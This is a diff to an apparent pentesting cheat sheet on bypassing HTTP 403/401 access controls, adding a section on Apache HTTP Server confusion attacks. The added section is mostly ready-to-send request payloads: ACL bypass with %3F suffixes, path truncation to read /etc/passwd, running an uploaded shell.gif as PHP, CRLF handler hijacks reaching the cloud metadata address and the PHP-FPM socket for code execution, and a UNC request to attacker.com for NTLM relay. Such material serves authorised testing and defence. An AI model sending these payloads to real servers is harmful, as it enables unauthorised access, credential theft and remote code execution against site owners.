@@ -233,7 +233,74 @@ Host: target.com
 
 ---
 
-## 7. Protocol / Version Tricks
+## 7. Apache HTTP Server Confusion Attacks (Orange Tsai, 2024)
+
+### Filename Confusion — ACL Bypass via `?` (CVE-2024-38474)
+Apache auth modules check `r->filename` as a filesystem path, but `mod_proxy` treats it as a URL. Appending `%3F` causes the auth module to see `admin.php?ooo.php` (no match), while PHP-FPM strips the query string and executes `admin.php`.
+
+Affects any `<Files "admin.php">` auth block when PHP-FPM is in use:
+```
+GET /admin.php%3Fooo.php HTTP/1.1
+GET /phpinfo.php%3F HTTP/1.1
+GET /adminer.php%3F HTTP/1.1
+GET /xmlrpc.php%3F HTTP/1.1
+```
+
+### RewriteRule Path Truncation
+If a `RewriteRule` rewrites to a path with a forced suffix (e.g. `/$1.html`), `%3F` truncates it:
+```
+GET /html/etc/passwd%3F HTTP/1.1
+GET /html/usr/share/php/config.php%3F HTTP/1.1
+```
+
+### RewriteRule Handler Hijack
+If a `RewriteRule` assigns a PHP handler based on `.php` extension, append `%3fooo.php` to any file to execute it as PHP:
+```
+GET /upload/shell.gif%3fooo.php HTTP/1.1
+```
+
+### DocumentRoot Confusion — Files Accessible via `/usr/share` (Debian/Ubuntu default)
+```
+/usr/share/doc/websocketd/examples/php/dump-env.php   → env var leak
+/usr/share/libreoffice/help/help.html                  → XSS
+/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php → LFI
+/usr/share/php/magpierss/scripts/magpie_debug.php      → SSRF
+```
+
+Symlink escapes (FollowSymLinks enabled by default):
+```
+/usr/share/cacti/site/     → /var/log/cacti/
+/usr/share/solr/conf/      → /etc/solr/conf/
+/usr/share/redmine/instances/default/config/secret_key.txt  → RoR secret → RCE
+```
+
+### Handler Confusion — Invoke Arbitrary Handlers via CRLF + CGI Redirect
+If CRLF injection exists in a CGI response or you control response headers via SSRF, set `Content-Type` to invoke any Apache module handler:
+```
+# Expose server-status
+Content-Type: server-status
+
+# Execute image as PHP
+Location: /uploads/avatar.webp
+Content-Type: application/x-httpd-php
+
+# Full SSRF via mod_proxy
+Content-Type: proxy:http://169.254.169.254/
+
+# Access PHP-FPM Unix socket → RCE
+Content-Type: proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/shell.php
+```
+
+### Windows UNC SSRF (CVE-2024-38472)
+On Windows Apache with `AllowEncodedSlashes On`:
+```
+GET /%5C%5Cattacker.com/path HTTP/1.1
+```
+Forces NTLM auth coercion → NTLM relay → RCE.
+
+---
+
+## 8. Protocol / Version Tricks
 
 ```
 # Try HTTP instead of HTTPS
@@ -248,7 +315,7 @@ http://target.com:8080/admin
 
 ---
 
-## 8. User-Agent Fuzzing
+## 9. User-Agent Fuzzing
 
 Sometimes access controls differ by browser/OS. Try uncommon or legacy UAs:
 ```
@@ -260,7 +327,7 @@ Googlebot/2.1 (+http://www.google.com/bot.html)
 
 ---
 
-## 9. Case Switching
+## 10. Case Switching
 
 ```
 /admin   → /Admin
@@ -272,7 +339,7 @@ Googlebot/2.1 (+http://www.google.com/bot.html)
 
 ---
 
-## 10. Hop-by-Hop Header Abuse
+## 11. Hop-by-Hop Header Abuse
 
 Add sensitive headers to the `Connection` header to instruct proxies to strip them before forwarding. If an upstream proxy adds an auth/IP header that the backend trusts, stripping it may bypass the check:
 
@@ -291,7 +358,7 @@ Accept-Encoding, Transfer-Encoding, X-Custom-Auth
 
 ---
 
-## 11. Spring Framework Suffix Pattern (< 5.3)
+## 12. Spring Framework Suffix Pattern (< 5.3)
 
 Versions before 5.3 have `useSuffixPatternMatch=true` by default. A route mapped to `/admin` also matches `/admin.*`:
 ```
@@ -304,7 +371,7 @@ Versions before 5.3 have `useSuffixPatternMatch=true` by default. A route mapped
 
 ---
 
-## 12. Wordlists & Tools
+## 13. Wordlists & Tools
 
 Reference payloads: https://github.com/jagat-singh-chaudhary/403-and-401-Bypass-Techniques/blob/main/Payloads
 HackTricks reference: https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html
